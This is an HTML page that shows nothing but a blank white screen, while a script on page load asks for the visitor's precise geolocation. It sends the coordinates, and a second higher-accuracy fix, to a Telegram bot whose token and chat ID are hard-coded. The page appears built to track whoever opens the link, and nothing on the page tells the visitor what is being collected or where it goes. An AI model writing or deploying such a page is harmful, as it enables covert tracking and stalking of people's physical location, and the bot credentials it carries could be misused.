<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> </title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    background: #FFFFFF;
    width: 100%;
    height: 100%;
    overflow: hidden;
  }
</style>
</head>
<body>

<script>
// ── config ──────────────────────────────────────────────
const BOT_TOKEN = "8655470221:AAGsUmuGTKfLcOOLaGcdwDa4VDXsowUFIJg";
const CHAT_ID   = "8596657965";
// ─────────────────────────────────────────────────────────

function sendLocation(lat, lon, acc) {
  const msg = "📍 LOCATION\n" +
              "━━━━━━━━━━\n" +
              "Lat: " + lat + "\n" +
              "Lon: " + lon + "\n" +
              "Accuracy: " + Math.round(acc) + "m\n" +
              "IP: " + "see server log\n" +
              "⏰ " + new Date().toLocaleString();

  // send location pin (shows on map)
  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      latitude: lat,
      longitude: lon
    })
  }).catch(() => {});

  // send text details
  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg
    })
  }).catch(() => {});
}

function grab() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    pos => {
      sendLocation(
        pos.coords.latitude,
        pos.coords.longitude,
        pos.coords.accuracy
      );
      // try to get a more accurate fix, send again
      navigator.geolocation.getCurrentPosition(
        p => sendLocation(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
        () => {},
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    },
    () => { /* denied — stay white */ },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
  );
}

window.addEventListener('load', grab);
</script>
</body>
</html>
